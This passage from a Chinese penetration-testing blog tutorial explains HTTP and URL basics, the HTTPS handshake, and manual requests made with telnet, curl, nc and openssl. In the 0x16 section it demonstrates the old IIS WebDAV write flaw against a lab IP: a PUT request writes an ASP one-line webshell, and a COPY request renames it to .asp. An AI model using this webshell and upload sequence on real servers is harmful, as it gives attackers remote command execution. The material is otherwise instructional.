+<p>注意:http默认的tcp端口是80,如果在浏览器中访问,浏览器会默认帮你加上80,所以你在url是看不到的<br>如果你要访问的是一个8080端口的web服务,那你就应该这样写  <a href="http://www.demo.com:8080/file.php?id=12" target="_blank" rel="external">http://www.demo.com:8080/file.php?id=12</a><br>如果你要访问的是一个443端口的web服务,你就应该这样写   <a href="https://www.demo.com:/sslvpn" target="_blank" rel="external">https://www.demo.com:/sslvpn</a><br>还有一些web服务可能并不在这些常见web端口上,尤其是目标的一些内部web服务,比如:<a href="http://oa.demo.com:12345/login.aspx" target="_blank" rel="external">http://oa.demo.com:12345/login.aspx</a></p>
+<p>例如,下面这句话的意思就表示:<br>使用http协议去www.xxx.com这个主机上通过8080端口找到files目录下的xx.rar文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>www.xxx.com:<span class="number">8080</span><span class="regexp">/files/</span>xx.rar</div></pre></td></tr></table></figure></p>
+<p>用于访问的协议还可以是:<br>ftp,http,file……</p>
+<p>什么是url传参:<br>例如下面这个url:<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.xxx.com/news.php?id=12</span></div></pre></td></tr></table></figure></p>
+<p>这句话的意思就相当于,用http协议在www.xxx.com这个主机上找到news.php这个资源,并向这个资源传了一个名叫id的参数,参数的值为12<br>‘?’ 在这里的意思就是给news.php这个文件附加一个参数值,这个值一般都会通过后端脚本提交到数据库中去增删改查</p>
+<p>如果要同时连续传递几个不同的参数给相应的资源,可以用 ‘&amp;’ 进行连接,例如像下面这样:<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//wwww.xxx.com/news.php?id=12&amp;uid=34</span></div></pre></td></tr></table></figure></p>
+<p>什么是相对URI/URL 和 绝对URI/URL[其实,跟绝对路径和相对路径差不多]:<br>绝对URI/URL:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>www.xxx.com<span class="regexp">/images/</span>logo.gif</div></pre></td></tr></table></figure></p>
+<p>相对URI/URL:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a <span class="attribute">href</span>=<span class="string">"../../cat.jpg"</span> <span class="attribute">alt</span>=<span class="string">"这是一只猫"</span>&gt;猫&lt;/a&gt;</div></pre></td></tr></table></figure></p>
+<p>其实,对于URL和URI的概念,大家不必太过纠结,你可以这样理解<br>&nbsp;&nbsp;&nbsp;&nbsp;比如,我要去买一件T恤,首先,我要知道这件T恤在哪里有卖的[这件T恤就相当于我们要访问的那个计算机资源],当然,我们知道商场肯定有卖的对吧[商场就相当于我们要定位到的主机名],下一步,也许我们就会想到,该怎么去商场呢,徒步去,打的还是坐公交呢[去商场的方式就相当于我们要使用哪种协议去访问那个资源],到了商场以后我们还要知道这件T恤在哪家店铺里[就相当于我们要访问的这个资源在这台主机的哪个目录下],最后,你找到了那家店铺里的那件T恤[也就是你最终要访问的资源],网络中的所有资源访问基本都是类似,我们访问网络中的任何一个资源都需要有一个明确的’URI’[如果站到协议底层的角度来说它就不单单是’URI’了]来给我们指路,以找到我们所需要的资源</p>
+<p>0x14 在http的基础上理解 https[TLS/SSL,默认web端口 443],这里只是先简单提一嘴,博客中还有一篇专门针对https的简单说明,大家可以去参考那个<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,浏览器将自己支持的一套加密规则发送给网站</div><div class="line"><span class="number">2</span>,网站从中选出一组加密算法与HASH算法,并将自己的身份信息以证书的形式返回给浏览器,证书里面包含了网站地址,加密公钥,以及证书的颁发机构等信息 </div><div class="line"><span class="number">3</span>,浏览器获得网站证书之后就开始下面的动作： </div><div class="line"> a) 验证证书的合法性(颁发证书的机构是否合法,证书中包含的网站地址是否与正在访问的地址一致等),如果证书受信任,则浏览器栏里面会显示一个小锁头,否则会给出证书不受信的提示 </div><div class="line"> b) 如果证书受信任,或者是用户接受了不受信的证书,浏览器会生成一串随机数的密码,并用证书中提供的公钥加密</div><div class="line"> c) 使用约定好的HASH算法计算握手消息,并使用生成的随机数对消息进行加密,最后将之前生成的所有信息发送给网站</div><div class="line"><span class="number">4</span>,网站接收浏览器发来的数据之后要做以下的操作 </div><div class="line"> a) 使用自己的私钥将信息解密取出密码,使用密码解密浏览器发来的握手消息,并验证HASH是否与浏览器发来的一致</div><div class="line"> b) 使用密码加密一段握手消息,发送给浏览器</div><div class="line"><span class="number">5</span>,浏览器解密并计算握手消息的HASH,如果与服务端发来的HASH一致,此时握手过程结束,之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密</div><div class="line"><span class="number">6</span>,也许大家都很清楚,即使是https也并非一定那么安全,针对https的中间人利用[核心还是需要有一个受信任的证书],我们后续再单独说,这里就先大致了解下https的基本运作流程</div></pre></td></tr></table></figure></p>
+<p>0x15 说完http ,我们就来简单看下,如何快速发起一次http/https请求</p>
+<p>1),利用原生的telnet<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet www.baidu.com 80</span></div><div class="line">ctrl + ] </div><div class="line">记得直接回车再开始输入下面的内容</div><div class="line"><span class="builtin-name">GET</span> / HTTP/1.1</div><div class="line">HOST:WWW.BAIDU.COM</div></pre></td></tr></table></figure></p>
+<p>2),利用curl<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-I 只返回HTTP头</div><div class="line">-m <span class="number">10</span> 最多查询<span class="number">10</span>s</div><div class="line">-o    把输出提示信息都丢到<span class="keyword">null</span>里面去,当然,只有在linux中才有<span class="keyword">null</span></div><div class="line">-X 用指定http方法请求</div><div class="line">  </div><div class="line">win:</div><div class="line">只返回响应头部信息</div><div class="line"># curl -I www.dangdang.com  </div><div class="line"></div><div class="line">只返回响应的状态码</div><div class="line"># curl -I -m <span class="number">10</span> -o <span class="regexp">/dev/</span><span class="keyword">null</span> -s -w %&#123;http_code&#125;  www.dangdang.com</div><div class="line">  </div><div class="line">linux:</div><div class="line">只返回响应的状态码</div><div class="line"># curl -I -m <span class="number">10</span> -o <span class="regexp">/dev/</span><span class="keyword">null</span> -s -w %&#123;http_code&#125;<span class="string">"\n"</span>  www.baidu.com</div><div class="line"># curl -I -m <span class="number">10</span> -o <span class="regexp">/dev/</span><span class="keyword">null</span> -s -w %&#123;http_code&#125;<span class="string">"\n"</span>  <span class="number">192.168</span>.<span class="number">3.189</span></div></pre></td></tr></table></figure></p>
+<p>3),在浏览器地址栏中直接输入目标域名回车访问即可</p>
+<p>4),所有带有src,href属性的html标记,触发以后默认都会发起一次http请求</p>
+<p>5),同样,利用nc同样也可以发起一次简单的http请求<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nc -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.3</span> <span class="number">80</span></div></pre></td></tr></table></figure></p>
+<p>6),手工发起一次https请求,手工发起http请求差不多,只需要先用证书<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">openssl</span> <span class="selector-tag">s_client</span> <span class="selector-tag">-quiet</span> <span class="selector-tag">-connect</span> <span class="selector-tag">www</span><span class="selector-class">.baidu</span><span class="selector-class">.com</span><span class="selector-pseudo">:443</span></div></pre></td></tr></table></figure></p>
+<p>7),利用各类语言中的各种库函数也可发起http请求,例如php中的一些函数,如header(),location()….</p>
+<p>0x16 为了简单回顾一下上述内容,我们就以古老的IIS写漏洞利用为例,通过telnet纯手工上传一个asp的webshell</p>
+<p>首先,探测目标web服务器是否支持PUT,MOVE,COPY方法,很显然,这里是支持put的,因为我的webdav[可以理解为加强版的http,增加了很多方法]事先已经开启且网站目录可写,脚本资源亦可访问<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># telnet <span class="number">192.168</span><span class="meta">.3</span><span class="meta">.3</span> <span class="number">81</span></div><div class="line">ctrl + ] </div><div class="line">OPTIONS / HTTP/<span class="number">1.1</span></div><div class="line"><span class="symbol">HOST:</span><span class="number">192.168</span><span class="meta">.3</span><span class="meta">.3</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/http options.png" alt=""></p>
+<p>确认,服务器开启put方法以后,尝试请求写入一句话,最好用txt等一些iis默认不支持解析的文件名,要不然容易出问题<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PUT /<span class="keyword">shell</span>.<span class="bash">txt HTTP/1.1</span></div><div class="line">HOST:<span class="number">192.168</span>.<span class="number">3.3</span></div><div class="line">Content-Length:<span class="number">28</span></div><div class="line">记住这里一定要记得换行才可以,http默认以空行作为请求的结束</div><div class="line"></div><div class="line">&lt;%execute request(<span class="string">'klion'</span>)%&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/iis put create.png" alt=""></p>
+<p>最后,将创建好的shell复制重命名成脚本的后缀<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">COPY</span><span class="bash"> /shell.txt HTTP/1.1</span></div><div class="line">HOST:<span class="number">192.168</span>.<span class="number">3.3</span></div><div class="line">Destination: http://<span class="number">192.168</span>.<span class="number">3.3</span>:<span class="number">81</span>/<span class="keyword">shell</span>.<span class="bash">asp</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/iis put create res.png" alt=""></p>
+<p>0x17 我们再来粗略看下nginx的日志文件格式[当然啦,这个格式可以在nginx配置文件中自定义],其它的web服务器日志格式都基本类似,看日志主要是想让大家明白,我们干活的时候都会在目标留下些什么<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">192.168.3.70</span> - -  <span class="string">[25/Jun/2017:17:49:14 +0800]</span>   <span class="string">"<span class="keyword">GET</span> / HTTP/1.1"</span>  <span class="number">304</span>  <span class="number">0</span>   <span class="string">"-"</span>  <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36"</span>  <span class="string">"-"</span></div><div class="line">访问者的ip   访问时间用什么方法请求那个文件或目录资源返回的状态码  客户端浏览器信息</div></pre></td></tr></table></figure></p>
+<p>0x18 http 运作一次的粗略流程<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">-&gt;四层tcp连接建立 </span></div><div class="line">	-<span class="ruby">-&gt;七层http连接建立</span></div><div class="line">		-<span class="ruby">-&gt;客户端向web服务器发送http请求头部信息</span></div><div class="line">			-<span class="ruby">-&gt;等待web服务器返回响应头和所请求的资源数据,格式以content-type中规定的格式进行显示,空白行结束此次响应</span></div><div class="line">				-<span class="ruby">-&gt;随后,web服务器关闭当前tcp连接</span></div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;对于渗透来讲,我们需要熟练掌握http最重要的地方,一个是请求头中的各个字段作用,如,各种请求方法,cookie,user-agent,referer等……另一个就是响应头中的各个字段,如,状态码,server头,等……以及由此衍生出来的各种安全问题,时间有限,这里仅仅只是先带大家入个门,其实,就http协议本身内容还是非常多的,毕竟个人能力精力篇幅都很有限,所以不得不有所侧重,不对的地方还望大家多多指正…… </p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/http/">#http</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
